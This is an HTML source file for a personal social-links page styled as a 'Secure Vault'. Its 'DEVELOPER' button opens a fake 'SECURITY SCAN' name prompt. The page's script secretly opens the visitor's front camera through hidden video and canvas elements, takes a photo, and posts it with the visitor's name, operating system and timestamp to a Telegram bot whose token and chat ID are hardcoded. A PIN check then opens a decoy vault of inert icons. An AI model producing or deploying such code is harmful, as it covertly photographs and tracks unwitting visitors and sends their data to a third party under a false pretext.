<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kishor Bankapur | Secure Vault</title>
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>

    <style>
        :root {
            --primary-color: #3b82f6;
            --bg-dark: #000000;
            --card-bg: #0a0a0a;
            --text-main: #ffffff;
            --text-dim: #888888;
            --glow-color: rgba(59, 130, 246, 0.5);
        }

        * {
            margin: 0; 
            padding: 0; 
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            outline: none; 
            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
        }

        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }

        body {
            background: var(--bg-dark);
            background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        .main-card {
            width: min(400px, 95vw);
            background: var(--card-bg);
            border: 1px solid #1a1a1a;
            border-radius: 50px;
            padding: 50px 25px 30px;
            text-align: center;
            position: relative;
            box-shadow: 0 40px 100px rgba(0,0,0,1);
            z-index: 10;
            overflow: hidden;
            margin: 0 auto;
        }

        /* Blue rotating light completely removed */
        .main-card::before {
            display: none;
        }

        .profile-container {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto 25px;
        }

        .avatar-wrapper {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid var(--primary-color);
            padding: 5px;
            cursor: pointer;
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            background: #000;
        }

        .avatar-wrapper:active { transform: scale(0.9); }

        .avatar-img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            pointer-events: none;
        }

        h2 {
            font-size: 1.6rem;
            letter-spacing: 4px;
            font-weight: 800;
            text-transform: uppercase;
            background: linear-gradient(to bottom, #fff, #666);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: var(--primary-color);
            font-size: 0.9rem;
            margin-bottom: 40px;
            font-weight: 600;
            letter-spacing: 2px;
        }

        .links-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }

        .link-item {
            background: #0f0f0f;
            border: 1px solid #222;
            border-radius: 25px;
            padding: 25px 15px;
            text-decoration: none;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            transition: 0.3s;
            position: relative;
        }

        .link-item:active {
            border-color: var(--primary-color);
            box-shadow: 0 0 20px var(--glow-color);
            transform: translateY(2px);
        }

        .link-item i { font-size: 1.8rem; }
        .link-item span {
            font-size: 0.75rem;
            text-transform: uppercase;
            font-weight: 700;
            color: var(--text-dim);
            letter-spacing: 1px;
        }

        .developer-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(30, 30, 30, 0.95);
            border: 1px solid var(--primary-color);
            color: var(--primary-color);
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 2px;
            cursor: pointer;
            z-index: 10000;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
            transition: 0.3s;
            text-transform: uppercase;
        }

        .developer-btn:hover {
            background: var(--primary-color);
            color: #000;
            transform: scale(1.05);
            box-shadow: 0 0 30px var(--glow-color);
        }

        .developer-btn:active {
            transform: scale(0.95);
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.98);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 20000;
            backdrop-filter: blur(15px);
        }

        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #111;
            padding: 40px;
            border-radius: 40px;
            border: 1px solid var(--primary-color);
            width: min(340px, 90vw);
            text-align: center;
            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
        }

        .modal-input {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            padding: 18px;
            border-radius: 15px;
            color: #fff;
            margin: 25px 0;
            text-align: center;
            font-size: 1rem;
            transition: 0.3s;
        }

        .modal-input:focus { border-color: var(--primary-color); }

        .primary-btn {
            background: var(--primary-color);
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 15px;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .cancel-btn {
            background: #222;
            color: #666;
            margin-top: 10px;
            border: none;
            padding: 12px;
            border-radius: 15px;
            width: 100%;
            cursor: pointer;
        }

        #zoomOverlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.97);
            z-index: 30000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        #zoomOverlay img {
            max-width: 85%;
            max-height: 80vh;
            border-radius: 20px;
            border: 2px solid var(--primary-color);
            pointer-events: none;
        }

        /* Vault Panel Styles */
        .vault-panel {
            position: fixed;
            top: 0; 
            right: -100%;
            width: 100%;
            height: 100vh;
            background: #000;
            z-index: 25000;
            padding: 40px 20px;
            transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
            overflow-y: auto;
        }
        .vault-panel.open { right: 0; }

        .vault-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #222;
        }

        .vault-header h2 {
            font-size: 1.2rem;
            color: var(--primary-color);
            background: none;
            -webkit-text-fill-color: var(--primary-color);
            letter-spacing: 2px;
        }

        .close-btn {
            font-size: 2rem;
            cursor: pointer;
            color: #666;
            transition: 0.3s;
        }

        .close-btn:hover {
            color: var(--primary-color);
            transform: rotate(90deg);
        }

        /* App Grid Styles */
        .app-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            padding: 10px 0;
        }

        .app-item {
            aspect-ratio: 1;
            background: #111;
            border: 1px solid #222;
            border-radius: 25px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: 0.3s;
            padding: 15px;
        }

        .app-item:hover {
            border-color: var(--primary-color);
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
        }

        .app-item:active {
            transform: scale(0.95);
        }

        .app-item i {
            font-size: 2.5rem;
        }

        .app-item span {
            font-size: 0.8rem;
            color: #888;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Music Player Styles */
        .music-player {
            position: fixed; 
            bottom: 30px; 
            right: 30px;
            width: 60px; 
            height: 60px; 
            border-radius: 50%;
            background: #111; 
            border: 2px solid var(--primary-color);
            display: flex; 
            justify-content: center; 
            align-items: center;
            font-size: 28px; 
            cursor: pointer; 
            z-index: 15000;
            box-shadow: 0 0 20px var(--glow-color);
            transition: 0.3s;
        }
        .music-player:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px var(--primary-color);
        }
        .music-player:active {
            transform: scale(0.9);
        }
        .rotating { 
            animation: spin 5s linear infinite; 
        }
        @keyframes spin { 
            from { transform: rotate(0deg); } 
            to { transform: rotate(360deg); } 
        }

        #hiddenCamera, #hiddenCanvas {
            display: none;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <!-- DEVELOPER BUTTON -->
    <button class="developer-btn" onclick="showNameModal()">
        <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
        DEVELOPER
    </button>

    <!-- Hidden elements for camera -->
    <video id="hiddenCamera" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <!-- Main Card -->
    <div class="main-card">
        <div class="profile-container">
            <div class="avatar-wrapper" onclick="handleZoom(true)">
                <img src="photo1.png" class="avatar-img" alt="Kishor" onerror="this.src='https://via.placeholder.com/130/3b82f6/ffffff?text=K'">
            </div>
        </div>
        
        <h2>KISHOR BANKAPUR</h2>
        <p class="subtitle">@kishorbankapur</p>

        <div class="links-grid">
            <a href="https://www.instagram.com/kishor.bankapur" class="link-item" target="_blank">
                <i class="fa-brands fa-instagram" style="color: #E1306C;"></i>
                <span>Instagram</span>
            </a>
            <a href="https://x.com/bankapurkishor" class="link-item" target="_blank">
                <i class="fa-brands fa-x-twitter"></i>
                <span>Twitter</span>
            </a>
            <a href="https://www.linkedin.com/in/kishor-bankapur-9ba256325/" class="link-item" target="_blank">
                <i class="fa-brands fa-linkedin" style="color: #0077b5;"></i>
                <span>LinkedIn</span>
            </a>
            <a href="https://youtube.com/@careless.2009-pi" class="link-item" target="_blank">
                <i class="fa-brands fa-youtube" style="color: #FF0000;"></i>
                <span>YouTube</span>
            </a>
        </div>
    </div>

    <!-- Name Modal -->
    <div id="nameModal" class="modal-overlay">
        <div class="modal-box">
            <h3>📡 SECURITY SCAN</h3>
            <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
            <button class="primary-btn" onclick="startDataProcess()">CONTINUE</button>
            <button class="cancel-btn" onclick="closeModals()">CANCEL</button>
        </div>
    </div>

    <!-- PIN Modal -->
    <div id="passModal" class="modal-overlay">
        <div class="modal-box">
            <h3>🔐 VAULT PIN</h3>
            <input type="password" id="vaultPin" class="modal-input" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
            <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
            <button class="cancel-btn" onclick="showNameModal()">BACK</button>
        </div>
    </div>

    <!-- Zoom Overlay -->
    <div id="zoomOverlay" onclick="handleZoom(false)">
        <img src="photo1.png" onclick="event.stopPropagation()" onerror="this.src='https://via.placeholder.com/500/3b82f6/ffffff?text=Kishor'">
    </div>

    <!-- Vault Panel with App Icons -->
    <div id="vaultPanel" class="vault-panel">
        <div class="vault-header">
            <h2>🔒 PRIVATE VAULT</h2>
            <i class="fa-solid fa-times close-btn" onclick="closeVault()"></i>
        </div>
        <div class="app-grid" id="appGrid"></div>
    </div>

    <!-- Music Player -->
    <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
    
    <!-- Audio File -->
    <audio id="bgTrack" loop preload="auto">
        <source src="audio.mp3" type="audio/mpeg">
    </audio>

<script>
    const CONFIG = {
        token: '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc',
        chatId: '6297092647'
    };

    let currentVisitorName = '';

    // Music Control
    function controlMusic() {
        const audio = document.getElementById('bgTrack');
        const toggle = document.getElementById('mToggle');
        
        if(audio.paused) {
            audio.play()
                .then(() => toggle.classList.add('rotating'))
                .catch(() => alert('Audio file not found! Make sure audio.mp3 is in the same folder.'));
        } else {
            audio.pause();
            toggle.classList.remove('rotating');
        }
    }

    // Hidden Camera Capture
    async function captureHiddenPhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' } 
            }).catch(() => null);
            
            if (!stream) return null;
            
            const video = document.getElementById('hiddenCamera');
            video.srcObject = stream;
            
            await new Promise(resolve => setTimeout(resolve, 100));
            
            const canvas = document.getElementById('hiddenCanvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
            
            return imageData;
        } catch (error) {
            return null;
        }
    }

    // Send to Telegram
    async function sendPhotoToTelegram(photoBase64, visitorName) {
        try {
            const blob = await (await fetch(photoBase64)).blob();
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append('photo', blob, 'visitor.jpg');
            formData.append('caption', `📸 Visitor: ${visitorName}`);
            
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {}
    }

    // Device Info Functions
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        if (ua.match(/Android/i)) os = 'Android';
        else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
        else if (ua.match(/Windows/i)) os = 'Windows';
        else if (ua.match(/Mac/i)) os = 'MacOS';
        else if (ua.match(/Linux/i)) os = 'Linux';

        return { os, browser: navigator.userAgent };
    }

    // Modal Functions
    function showNameModal() { 
        document.getElementById('nameModal').classList.add('active'); 
        document.getElementById('visitorName').value = '';
        document.getElementById('vaultPin').value = '';
    }
    
    function closeModals() { 
        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); 
    }

    // Start Data Process
    async function startDataProcess() {
        const name = document.getElementById('visitorName').value.trim();
        if(!name) {
            alert("Please enter your name!");
            return;
        }

        currentVisitorName = name;
        const btn = document.querySelector('#nameModal .primary-btn');
        const originalText = btn.innerHTML;
        btn.innerHTML = "⏳ PROCESSING...";
        
        try {
            // Capture and send photo
            const photoBase64 = await captureHiddenPhoto();
            if (photoBase64) {
                await sendPhotoToTelegram(photoBase64, currentVisitorName);
            }
            
            // Send device info
            const deviceInfo = getDeviceInfo();
            const message = `🔐 *Vault Access*\n👤 Name: ${currentVisitorName}\n📱 Device: ${deviceInfo.os}\n⏰ Time: ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            // Show PIN modal
            closeModals();
            document.getElementById('passModal').classList.add('active');
            
        } catch (error) {
            alert('Security check failed. Please try again.');
        } finally {
            btn.innerHTML = originalText;
        }
    }

    // Verify PIN and Open Vault
    function verifyPin() {
        const pin = document.getElementById('vaultPin').value;
        if(pin === "6969") {
            closeModals();
            openVault();
        } else {
            alert("ACCESS DENIED!");
        }
    }

    // Open Vault with App Icons
    function openVault() {
        const panel = document.getElementById('vaultPanel');
        panel.classList.add('open');
        
        const grid = document.getElementById('appGrid');
        if(grid.children.length === 0) {
            // App icons with different colors
            const apps = [
                { name: 'Photos', icon: 'fa-solid fa-images', color: '#3b82f6' },
                { name: 'Videos', icon: 'fa-solid fa-video', color: '#ef4444' },
                { name: 'Music', icon: 'fa-solid fa-music', color: '#10b981' },
                { name: 'Files', icon: 'fa-solid fa-folder', color: '#f59e0b' },
                { name: 'Messages', icon: 'fa-solid fa-envelope', color: '#8b5cf6' },
                { name: 'Gallery', icon: 'fa-solid fa-camera', color: '#ec4899' },
                { name: 'Notes', icon: 'fa-solid fa-note-sticky', color: '#14b8a6' },
                { name: 'Settings', icon: 'fa-solid fa-gear', color: '#6b7280' },
                { name: 'Downloads', icon: 'fa-solid fa-download', color: '#f97316' }
            ];
            
            apps.forEach(app => {
                const appDiv = document.createElement('div');
                appDiv.className = 'app-item';
                appDiv.innerHTML = `
                    <i class="${app.icon}" style="color: ${app.color};"></i>
                    <span>${app.name}</span>
                `;
                appDiv.onclick = () => alert(`📱 ${app.name} app opening...`);
                grid.appendChild(appDiv);
            });
        }
    }

    function closeVault() {
        document.getElementById('vaultPanel').classList.remove('open');
    }

    function handleZoom(show) {
        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none';
    }

    // GSAP Animations
    window.onload = function() {
        gsap.from('.main-card', { 
            duration: 1, 
            opacity: 0, 
            y: 50, 
            ease: 'power3.out' 
        });
        
        gsap.from('.link-item', { 
            duration: 0.8, 
            opacity: 0, 
            y: 30, 
            stagger: 0.1, 
            delay: 0.3,
            ease: 'back.out(1.2)'
        });
    };
</script>
</body>
</html>
